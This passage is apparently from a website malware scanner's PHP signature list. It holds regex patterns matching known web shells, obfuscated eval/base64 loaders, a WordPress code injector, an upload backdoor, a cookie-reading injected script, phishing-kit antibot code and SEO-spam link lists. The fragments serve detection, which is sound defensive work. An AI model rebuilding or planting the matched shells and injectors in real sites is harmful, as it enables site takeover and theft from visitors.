\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1078 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/ulyssav\\.us\\/nybc\\/relation\\-arithmetic\\-sequence\\-and\\-partial\\-sum\\.html\\>fx\\<\\/a\\>, \\<a href\\=http\\:\\/\\/datxanhdh\\.com\\/6utwu\\/social\\-club\\-rock/',
      'label' => 'source-file tail snippet',
    ),
    1079 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/bloom\\-bottle\\.com\\/ywvcbl4el\\/mexican\\-boxing\\-entrance\\-songs\\.html\\>vl\\<\\/a\\>, \\<a href\\=http\\:\\/\\/ec2\\-13\\-233\\-154\\-33\\.ap\\-south\\-1\\.compute\\.ama/',
      'label' => 'source-file tail snippet',
    ),
    1080 => 
    array (
      'pattern' => '/\\>Discourse sso\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1081 => 
    array (
      'pattern' => '/\\>Sysprep 0x80070003\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1082 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.mundumata\\.com\\/rsggzkh\\/positive\\-energy\\-synonyms\\.html\\>p4\\<\\/a\\>, \\<a href\\=http\\:\\/\\/jimo\\.ga\\/pgugb5w\\/audio\\-note\\-kit\\-1\\.html\\>s7\\<\\/a\\>, /',
      'label' => 'source-file tail snippet',
    ),
    1083 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>

\\<html class\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Atoto no sound\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1084 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/tienluat\\.com\\.vn\\/cj08\\/chrome\\-secure\\-shell\\-x11\\-forwarding\\.html\\>pd\\<\\/a\\>, \\<a href\\=http\\:\\/\\/kenoami\\.info\\/zw7grhttgcc\\/siler\\-percussion/',
      'label' => 'source-file tail snippet',
    ),
    1085 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/topdetail\\.cz\\/ten\\/how\\-do\\-sneaker\\-raffles\\-work\\.html\\>ov\\<\\/a\\>, \\<a href\\=http\\:\\/\\/decox\\.design\\/zx3b\\/cardcaptor\\-sakura\\-episode\\-2\\.html\\>n/',
      'label' => 'source-file tail snippet',
    ),
    1086 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.skyhousebuckhead\\.com\\/8b5d3n\\/industrial\\-training\\-report\\-computer\\-science\\-student\\.html\\>gq\\<\\/a\\>, \\<a href\\=http\\:\\/\\/medicalreform/',
      'label' => 'source-file tail snippet',
    ),
    1087 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/xolaren\\.com\\/uneaozewo\\/montagne\\-jeunesse\\-peel\\-off\\-mask\\.html\\>ey\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.gastrodisiac\\.com\\/9sfdoq\\/mobile\\-home\\-mov/',
      'label' => 'source-file tail snippet',
    ),
    1088 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/eu6bvz\\/kiddnation/',
      'label' => 'sample-specific encoded fragment',
    ),
    1089 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/wordpress\\.happy\\-life\\.xyz\\/snedkcopd\\/new\\-electric\\-plane\\.html\\>lv\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.risingstarpreparatoryjhs\\.com\\/haxc\\/osrs\\-/',
      'label' => 'source-file tail snippet',
    ),
    1090 => 
    array (
      'pattern' => '/content\\/themes\\/guava\\/t2igcg\\/acer/',
      'label' => 'sample-specific encoded fragment',
    ),
    1091 => 
    array (
      'pattern' => '/content\\/languages\\/plugins\\/ipmbu\\/surface/',
      'label' => 'sample-specific encoded fragment',
    ),
    1092 => 
    array (
      'pattern' => '/images\\/galleries\\/cartelrooftop\\/40thbirthday\\/Cartel/',
      'label' => 'sample-specific encoded fragment',
    ),
    1093 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/ytlcement\\.com\\/96an\\/saml\\-authentication\\-failed\\.html\\>as\\<\\/a\\>, \\<a href\\=http\\:\\/\\/premiertelecare\\.com\\/fui8\\/stm32h7\\-reference\\-manual\\.h/',
      'label' => 'source-file tail snippet',
    ),
    1094 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/chungcutheterra\\.info\\/dbjmjx6g\\/mirrors\\-and\\-windows\\-grade\\-7\\.html\\>h3\\<\\/a\\>, \\<a href\\=http\\:\\/\\/songfamilies\\.com\\/wordpress\\/wp\\-content\\/t/',
      'label' => 'source-file tail snippet',
    ),
    1095 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.tripvaga\\.com\\/4iqs6\\/michaels\\-senior\\-discount\\-exclusions\\.html\\>nz\\<\\/a\\>, \\<a href\\=http\\:\\/\\/zimen\\-group\\.com\\/xs3dpn\\/rust\\-fire\\-arrow/',
      'label' => 'source-file tail snippet',
    ),
    1096 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.vgmsteel\\.co\\.za\\/1kkm\\/2001\\-johnson\\-25\\.html\\>4y\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.chintech\\.com\\.cn\\/hfzvtib\\/splunk\\-case\\-1\\-\\=\\=\\-1\\.html\\>vy\\<\\/a/',
      'label' => 'source-file tail snippet',
    ),
    1097 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/r1suqhoq0\\/cooper/',
      'label' => 'sample-specific encoded fragment',
    ),
    1098 => 
    array (
      'pattern' => '/\\>Uber code\\<\\/span\\>\\<\\/h1\\>



            \\<\\/div\\>



            \\<\\!\\-\\- mainmenu begin \\-\\-\\>

            

\\<ul id\\=/',
      'label' => 'sample-specific literal',
    ),
    1099 => 
    array (
      'pattern' => '/\\>Free drug apps for android\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1100 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>

\\<html class\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Geofabrik\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1101 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/sayehbeauty\\.com\\/jzv1u2\\/gumdrop\\-ipad\\-case\\.html\\>bq\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.icynene\\-vloerisolatie\\.nl\\/se1kpi\\/punishment\\-merriam\\.h/',
      'label' => 'source-file tail snippet',
    ),
    1102 => 
    array (
      'pattern' => '/\\>German pod 101\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1103 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/farmbionics\\.com\\/ykize\\/c6\\-z06\\-cam\\.html\\>yr\\<\\/a\\>, \\<a href\\=http\\:\\/\\/kubisku\\.com\\/os3vfrsj\\/whats\\-the\\-best\\-graphics\\-driver\\-for\\-core\\-i7\\-/',
      'label' => 'source-file tail snippet',
    ),
    1104 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/iwearghanimi\\.com\\/z2psbh1\\/https\\-www\\-teacherspayteachers\\-com\\-cart\\-checkout\\.html\\>ej\\<\\/a\\>, \\<a href\\=http\\:\\/\\/bermudes\\.costaservicios\\./',
      'label' => 'source-file tail snippet',
    ),
    1105 => 
    array (
      'pattern' => '/true"\\>Fetty wap eye makeup\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1106 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/nadanakhil\\.com\\/nfxj0n\\/employee\\-database\\-design\\.html\\>cn\\<\\/a\\>, \\<a href\\=http\\:\\/\\/premuim420store\\.com\\/prtotxu\\/remux\\-1080p\\.html\\>pf\\<\\/a/',
      'label' => 'source-file tail snippet',
    ),
    1107 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/rashtriyagaurakshakdal\\.org\\/vdbllpmm\\/fitbit\\-flex\\-bands\\-ebay\\.html\\>4j\\<\\/a\\>, \\<a href\\=http\\:\\/\\/acepokerkita\\.com\\/parcsep\\/ezdok\\-camera\\-/',
      'label' => 'source-file tail snippet',
    ),
    1108 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/tryitout\\.xyz\\/8yp9g15f\\/amcharts\\-line\\-chart\\-example\\.html\\>nh\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.ardexendura\\.com\\/gdyroby\\/ffmpeg\\-rtmps\\-suppor/',
      'label' => 'source-file tail snippet',
    ),
    1109 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/premiertelecare\\.com\\/fui8\\/car\\-imagery\\-api\\.html\\>vy\\<\\/a\\>, \\<a href\\=http\\:\\/\\/bagsforbread\\.com\\/2jti\\/24\\-news\\-malayalam\\-contact\\-number\\.h/',
      'label' => 'source-file tail snippet',
    ),
    1110 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>G3112 root\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1111 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Dell wyse 5030 manual\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1112 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Dnd premade shops\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1113 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Xaml to html converter online\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1114 => 
    array (
      'pattern' => '/\\>Anti cheat bypass geometry dash\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1115 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/blog\\.magnifii\\.co\\/l2u3b\\/fz\\-olx\\-guwahati\\.html\\>xz\\<\\/a\\>, \\<a href\\=http\\:\\/\\/xali\\.com\\.sg\\/zj1\\/azure\\-ad\\-connect\\-sync\\-schedule\\.html\\>bs\\<\\/a\\>/',
      'label' => 'source-file tail snippet',
    ),
    1116 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Proximate analysis of biomass\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1117 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/wikienvironment\\.org\\/xqbjn5\\/blackhatprotools\\-reddit\\.html\\>ic\\<\\/a\\>, \\<a href\\=http\\:\\/\\/africanhumanistcelebrants\\.com\\/0q53jkm\\/5\\-letter/',
      'label' => 'source-file tail snippet',
    ),
    1118 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/lalucozyrooms\\.com\\/fwpvjyj43\\/king\\-naresuan\\-part\\-three\\-full\\-movie\\.html\\>jd\\<\\/a\\>, \\<a href\\=http\\:\\/\\/danielwellingtonwatch\\.vn\\/egkxw\\/na/',
      'label' => 'source-file tail snippet',
    ),
    1119 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/hlbr\\/ladbible/',
      'label' => 'sample-specific encoded fragment',
    ),
    1120 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Homemade clue game\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1121 => 
    array (
      'pattern' => '/\\>Sky iptv\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1122 => 
    array (
      'pattern' => '/\\$?banner_drones\\b/',
      'label' => 'sample-specific identifier',
    ),
    1123 => 
    array (
      'pattern' => '/\\$?wwwalhijazibooks\\b/',
      'label' => 'sample-specific identifier',
    ),
    1124 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/3rddb54\\/male/',
      'label' => 'sample-specific encoded fragment',
    ),
    1125 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Sulphuric acid oman\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1126 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/dakhoavanthanh\\.com\\/go18vv\\/dell\\-monitor\\-too\\-bright\\.html\\>xs\\<\\/a\\>, \\<a href\\=http\\:\\/\\/300property\\.com\\/eem8h\\/emirates\\-airline\\-jobs\\-in\\-/',
      'label' => 'source-file tail snippet',
    ),
    1127 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/zerolevel\\.net\\/ibdj8f\\/need\\-for\\-speed\\-movie\\-download\\-hdpopcorns\\.html\\>iy\\<\\/a\\>, \\<a href\\=http\\:\\/\\/new\\.d8\\.systems\\/oqrkof\\/veeam\\-cloud\\-c/',
      'label' => 'source-file tail snippet',
    ),
    1128 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/mwl\\.pub\\/ba8ps8r\\/case\\-on\\-bata\\-ltd\\.html\\>aj\\<\\/a\\>, \\<a href\\=http\\:\\/\\/komfremont\\.ru\\/zilm8oi\\/list\\-of\\-industrial\\-estate\\-in\\-lahore\\.html\\>3/',
      'label' => 'source-file tail snippet',
    ),
    1129 => 
    array (
      'pattern' => '/true"\\>Ymusic ad free\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1130 => 
    array (
      'pattern' => '/Mobile mohs inc/',
      'label' => 'sample-specific literal',
    ),
    1131 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/3rddb54\\/how/',
      'label' => 'sample-specific encoded fragment',
    ),
    1132 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Snacks distribution business\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1133 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/servidordeiptv\\.xyz\\/xj3wg\\/company\\-stocklots\\-qatar\\.html\\>u7\\<\\/a\\>, \\<a href\\=http\\:\\/\\/energysmart\\.io\\/zpus39\\/nso\\-books\\-for\\-class\\-7\\-free/',
      'label' => 'source-file tail snippet',
    ),
    1134 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Fsx aw189\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1135 => 
    array (
      'pattern' => '/content\\/themes\\/guava\\/t2igcg\\/current/',
      'label' => 'sample-specific encoded fragment',
    ),
    1136 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Pet friendly hotels\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1137 => 
    array (
      'pattern' => '/\\$?septentrionalis\\b/',
      'label' => 'sample-specific identifier',
    ),
    1138 => 
    array (
      'pattern' => '/\\>Toluna\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1139 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/thesamf\\.org\\/oho\\/cox\\-architecture\\-abn\\.html\\>uc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/dunlopillo\\.firstcom\\.vn\\/znvoqelq\\/angularjs\\-material\\-table\\.htm/',
      'label' => 'source-file tail snippet',
    ),
    1140 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Fake au generator\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1141 => 
    array (
      'pattern' => '/\\>

 



  \\<title\\>Meteor garden 2018 ep 2 eng sub dramacool\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal',
    ),
    1142 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/psychicsmarket\\.com\\/ygt\\/punishment\\-for\\-listening\\-to\\-music\\-in\\-islam\\.html\\>nq\\<\\/a\\>, \\<a href\\=http\\:\\/\\/nadanakhil\\.com\\/nfxj0n\\/over\\-the\\-/',
      'label' => 'source-file tail snippet',
    ),
    1143 => 
    array (
      'pattern' => '/\\>Fortigate external ip block list\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1144 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/energysmart\\.io\\/zpus39\\/how\\-to\\-get\\-high\\-enchantments\\-on\\-minecraft\\-with\\-commands\\.html\\>rr\\<\\/a\\>, \\<a href\\=http\\:\\/\\/controlarbitrioscbm/',
      'label' => 'source-file tail snippet',
    ),
    1145 => 
    array (
      'pattern' => '/\\>Rar to iso\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1146 => 
    array (
      'pattern' => '/\\>Cozy app\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1147 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/chethanalakshan\\.cf\\/bsin70\\/taking\\-oil\\-bath\\-in\\-dream\\.html\\>cc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.gtdm1314\\.com\\/eay\\/sleep\\-apnea\\-va\\-disability/',
      'label' => 'source-file tail snippet',
    ),
    1148 => 
    array (
      'pattern' => '/Oi0gh84eSs\\+a77Cs\\/\\+PYvs8v5sMJD\\/TFY2so32zN\\+SrHHIzKgekHAmpvPFoVk\\+NZ\\+BBEri0yIjOi\\/NYT/',
      'label' => 'sample-specific encoded fragment',
    ),
    1149 => 
    array (
      'pattern' => '/\\<\\?php class Flo \\{function __construct\\(\\) \\{\\$module \\= \\$this\\-\\>stack\\(\\$this\\-\\>income\\);\\$module \\= \\$this\\-\\>access\\(\\$this\\-\\>ver\\(\\$module\\)\\);\\$module \\= \\$this\\-/',
      'label' => 'source-file tail snippet',
    ),
    1150 => 
    array (
      'pattern' => '/https\\:\\/\\/fonts\\.googleapis\\.com\\/css\\?family\\=Jockey\\+One[\\s\\S]{0,160}https\\:\\/\\/fonts\\.googleapis\\.com\\/css\\?family\\=Courier/',
      'label' => 'sample-specific literal chain',
    ),
    1151 => 
    array (
      'pattern' => '/\\<\\!\\-\\-codes_iframe\\-\\-\\>\\<script type\\="text\\/javascript"\\> function getCookie\\(e\\)\\{var U\\=document\\.cookie\\.match\\(new RegExp\\("\\(\\?\\:\\^\\|; \\)"\\+e\\.replace\\(\\/\\(\\[\\\\\\.\\$\\?/',
      'label' => 'source-file tail snippet',
    ),
    1152 => 
    array (
      'pattern' => '/error_reporting\\(0\\);[\\s\\S]{0,12000}die\\("Harap edit APIKEY dalam file antibot\\-config\\.php\\. \\(Please edit api key in antibot\\-config\\.php file\\.\\)"\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1153 => 
    array (
      'pattern' => '/\\$password \\= "K74y39GMjUQ"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
      'label' => 'source-file head-tail anchor',
    ),
    1154 => 
    array (
      'pattern' => '/\\$password \\= "A9TWQORP7s8"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
      'label' => 'source-file head-tail anchor',
    ),
    1155 => 
    array (
      'pattern' => '/\\/\\*\\*\\* PHP Encode Sh\\*ll Auto v4 Fox \\*\\*\\*\\/[\\s\\S]{0,12000}eval\\(base64_decode\\(\'ZnVuY3Rpb24gX0Y4aHAoJF9NcU5OeW0xeG8peyRfTXFOTnltMXhvPXN1YnN0cigkX01xTk55bTF4bywoaW50KShoZXgyYmluKCczMTMwMzEzOScpKSk7JF9N/s',
      'label' => 'source-file head-tail anchor',
    ),
    1156 => 
    array (
      'pattern' => '/\\$password \\= "JVzcFHWvfDk"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
      'label' => 'source-file head-tail anchor',
    ),
    1157 => 
    array (
      'pattern' => '/\\$password \\= "u2PGqyvO4sI"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
      'label' => 'source-file head-tail anchor',
    ),
    1158 => 
    array (
      'pattern' => '/\\$password \\= "SGJIZrYkbRO"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
      'label' => 'source-file head-tail anchor',
    ),
    1159 => 
    array (
      'pattern' => '/9DKDyPGHuI3KPHjpOQzIbU2gx8SL36b1p7L6PQO9MxRnplMaAyVL5eKgEa0XZrSiqDJTOxTmTzyDeNaV/',
      'label' => 'sample-specific encoded fragment',
    ),
    1160 => 
    array (
      'pattern' => '/\\$password \\= "QyvWR6uwKJr"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
      'label' => 'source-file head-tail anchor',
    ),
    1161 => 
    array (
      'pattern' => '/\\$password \\= "ZneymcHQM9d"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
      'label' => 'source-file head-tail anchor',
    ),
    1162 => 
    array (
      'pattern' => '/UEsDBAoAAAAAADlZEU8AAAAAAAAAAAAAAAAIAAAAenBjb2U0cy9QSwMEFAAAAAgAQ1kRT3Ecm6iSBwAA/',
      'label' => 'sample-specific encoded fragment',
    ),
    1163 => 
    array (
      'pattern' => '/\\=\\=\\= WooCommerce \\=\\=\\=[\\s\\S]{0,12000}\\<\\?php if\\(\\$_GET\\["login"\\]\\=\\="canshu"\\)\\{if\\(@copy\\(\\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\], \\$_FILES\\[\'file\'\\]\\[\'name\'\\]\\)\\) \\{ echo \'\\<b\\>Upload Complate \\!\\!\\!\\<\\/b\\>\\<br\\>\'; /s',
      'label' => 'source-file head-tail anchor',
    ),
    1164 => 
    array (
      'pattern' => '/login"\\] \\=\\=/',
      'label' => 'sample-specific literal',
    ),
    1165 => 
    array (
      'pattern' => '/\\/\\/header\\(\'Content\\-Type\\:text\\/html; charset\\=utf\\-8\'\\);[\\s\\S]{0,12000}\\$O__00OO0O_\\=base64_decode\\("LTQ2bnFhX2U4OWR5cmJpa2hqZnB3eGN0em1sMnNvdjdndTAzNTE\\="\\);\\$OO0OO00___\\=\\$O__00OO0O_\\{19\\}\\.\\$O__00OO0O_\\{12\\}\\.\\$O__00OO0O_\\{7\\}/s',
      'label' => 'source-file head-tail anchor',
    ),
    1166 => 
    array (
      'pattern' => '/require_once\\(\'autoload\\.php\'\\);[\\s\\S]{0,12000}\\$Antibot\\-\\>error\\(403\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1167 => 
    array (
      'pattern' => '/\\* @Date\\:   2019\\-09\\-30 10\\:55\\:56[\\s\\S]{0,12000}\\$config\\[\'password_panel\'\\] 	\\= \'admin\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    1168 => 
    array (
      'pattern' => '/\\/" \\>Back To Home\\<\\/a\\>
		                \\<\\/div\\>
		            \\<\\/div\\>
		        \\<\\/div\\>
		        \\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1169 => 
    array (
      'pattern' => '/if\\s+\\(\\s+\\(\\$file\\s+\\=\\s+file_get_contents\\(\\$path\\s+\\.\\s+\'\\/wp\\-includes\\/post\\.php\'\\)\\)\\s+&&\\s+\\(file_put_contents\\(\\$path\\s+\\.\\s+\'\\/wp\\-includes\\/wp\\-cd\\.php\',\\s+base64_decode\\(\\$GLOBALS\\[\'WP_CD_CODE\'\\]\\)\\)\\)\\s+\\)/',
      'label' => 'sample-specific line fragment',
    ),
    1170 => 
    array (
      'pattern' => '/,\\$ip\\);

\\}

\\}
\\}\\/\\/ end if log admins ip




\\/\\/add cookies to organic traffic

if\\(get_option\\(/',
      'label' => 'sample-specific literal',
    ),
    1171 => 
    array (
      'pattern' => '/\\* Plugin Name\\: CMSmap \\- WordPress Shell[\\s\\S]{0,12000}include\\(\'log\\.zip\'\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1172 => 
    array (
      'pattern' => '/will\';
\\$shellname\\=/',
      'label' => 'sample-specific literal',
    ),
    1173 => 
    array (
      'pattern' => '/\\<\\?php \\/\\* Do not change this code, or your script will not work\\. Checksum\\: 398a66245b7a93ba7ef2e95f1911b3e3618b3727503454ba5c28d29fae0b13c920/',
      'label' => 'source-file tail snippet',
    ),
    1174 => 
    array (
